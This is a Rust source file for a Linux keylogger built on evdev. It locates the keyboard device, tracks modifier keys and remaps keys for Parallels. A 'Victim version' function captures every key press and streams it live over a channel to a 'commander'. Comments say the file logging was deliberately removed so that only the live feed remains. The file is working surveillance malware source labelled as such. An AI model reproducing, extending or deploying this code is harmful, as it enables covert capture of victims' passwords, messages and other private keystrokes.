use evdev::{Device, EventSummary, KeyCode};
use std::fs;
use std::sync::mpsc::{self, Receiver, Sender};
use std::io::{self, Write};

#[derive(Debug)]
pub enum Control {
    Stop,
}

#[derive(Default, Debug)]
struct Modifiers {
    shift: bool,
    ctrl: bool,
    alt: bool,
    meta: bool,
    capslock: bool,
}

impl Modifiers {
    fn update(&mut self, key: KeyCode, value: i32) {
        let pressed = value == 1;
        match key {
            KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
            KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
            KeyCode::KEY_LEFTALT | KeyCode::KEY_RIGHTALT => self.alt = pressed,
            KeyCode::KEY_LEFTMETA | KeyCode::KEY_RIGHTMETA => self.meta = pressed,
            KeyCode::KEY_CAPSLOCK if pressed => self.capslock = !self.capslock,
            _ => {}
        }
    }
}

fn find_keyboard() -> io::Result<(Device, String)> {
    let mut candidates = Vec::new();
    for entry in fs::read_dir("/dev/input")? {
        let path = entry?.path();
        if !path.to_string_lossy().contains("event") { continue; }

        if let Ok(device) = Device::open(&path) {
            let Some(keys) = device.supported_keys() else { continue; };
            let rel_axes = device.supported_relative_axes();
            let abs_axes = device.supported_absolute_axes();

            if rel_axes.is_some() || abs_axes.is_some() {
                continue; 
            }

            if keys.contains(KeyCode::KEY_A) 
                && keys.contains(KeyCode::KEY_F1) 
                && keys.contains(KeyCode::KEY_F10) 
            {
                candidates.push((device, path.to_string_lossy().to_string()));
            }
        }
    }

    if let Some(final_choice) = candidates.pop() {
        return Ok(final_choice);
    }

    Err(io::Error::new(io::ErrorKind::NotFound, "No suitable keyboard found"))
}

fn parallels_remap(key: KeyCode) -> KeyCode {
    match key {
        KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
        KeyCode::KEY_RIGHTMETA => KeyCode::KEY_RIGHTALT,
        KeyCode::KEY_LEFTALT => KeyCode::KEY_LEFTMETA,
        KeyCode::KEY_RIGHTALT => KeyCode::KEY_RIGHTMETA,
        _ => key,
    }
}

/// Standalone/Debug version
pub fn run() -> io::Result<()> {
    let (mut device, path) = find_keyboard()?;
    let mut modifiers = Modifiers::default();
    device.set_nonblocking(false)?;

    println!("Debugging Keylogger on: {}", path);
    loop {
        for ev in device.fetch_events()? {
            if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                let key = parallels_remap(raw_key);
                modifiers.update(key, value);
                if value == 1 {
                    println!("[{:?}] Modifiers: {:?}", key, modifiers);
                }
            }
        }
    }
}

/// Victim version - NO FILE SAVING, ONLY LIVE CHANNEL
pub fn run_with_control(
    control_rx: Receiver<Control>,
    key_tx: Sender<String>,
) -> io::Result<()> {
    let (mut device, _path) = find_keyboard()?;
    
    // FIX: REMOVED all file saving - no ./data/ directory, no captured_keys.txt
    // Keylogger now ONLY sends via key_tx channel (live to commander)
    
    device.set_nonblocking(true)?;
    let mut modifiers = Modifiers::default();

    loop {
        // 1. Check control channel
        match control_rx.try_recv() {
            Ok(Control::Stop) | Err(mpsc::TryRecvError::Disconnected) => break,
            Err(mpsc::TryRecvError::Empty) => {}
        }

        // 2. Read events
        match device.fetch_events() {
            Ok(events) => {
                for ev in events {
                    if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                        let key = parallels_remap(raw_key);

                        // Update modifiers for ALL events (press AND release)
                        modifiers.update(key, value);

                        // Only SEND on actual key presses (value == 1)
                        if value == 1 {
                            let key_name = format!("{:?}", key).replace("KEY_", "");
                            let mut output = String::new();
                            
                            if modifiers.shift    { output.push_str("[SHIFT] "); }
                            if modifiers.capslock { output.push_str("[CAPS] "); }
                            output.push_str(&key_name);
                            output.push(' ');

                            // ONLY send to live channel - NO FILE WRITING
                            let _ = key_tx.send(output);
                        }
                    }
                }
            }
            Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            Err(e) => return Err(e),
        }
    }

    // FIX: REMOVED println about saving logs
    Ok(())
}

#[allow(dead_code)]
fn main() -> io::Result<()> {
    run()
}
